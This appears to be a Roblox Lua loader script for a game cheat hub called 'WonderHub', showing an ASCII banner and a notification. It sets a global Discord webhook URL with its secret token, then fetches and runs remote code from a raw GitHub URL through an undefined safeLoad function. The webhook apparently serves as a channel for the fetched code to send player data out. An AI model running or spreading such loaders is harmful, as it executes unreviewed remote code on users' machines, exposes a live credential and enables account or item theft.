getgenv().WebhookUrl = "https://ptb.discord.com/api/webhooks/1451199354873446534/Iw4K80ggoKVESRKdinjElOT4n9_ZlF5gRELUe3vK2m3rcWnN6zb3AoTOkONm4gzJK3mG"


print([[     
-----------------------------------------------------------------------------------

   ██   ██  █████  ██   ██ █████  ██████ ██████       ██  ██ ██   ██ ██████ 
   ██   ██ ██   ██ ███  ██ ██  ██ ██      ██   ██     ██  ██ ██   ██ ██  ██ 
   ██   ██ ██   ██ ████ ██ ██   ██ █████  ██████      ██████ ██   ██ █████ 
   ██ █ ██ ██   ██ ██ ████ ██   ██ ██     ██ ██       ██  ██ ██   ██ ██  ██ 
   ███████ ██   ██ ██  ███ ██  ██  ██     ██  ██      ██  ██ ██   ██ ██  ██ 
   ██   ██  █████  ██   ██ █████   ██████ ██   ██     ██  ██  █████  ██████ 

          🚀 WONDERHUB — Loading with style 🚀
-----------------------------------------------------------------------------------
 ]])

if not game:IsLoaded() then
	game.Loaded:Wait()
end

-- Notification helper
local function notify(title, text, duration)
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = duration or 6
		})
	end)
end

-- Notify user
print("Sigma cat","Loading WonderHub...")
notify("Sigma Cat", " loading WonderHub…", 6)
safeLoad("https://raw.githubusercontent.com/risinduvix-creator/Wonder-Hub/refs/heads/main/Wonder-99nights")


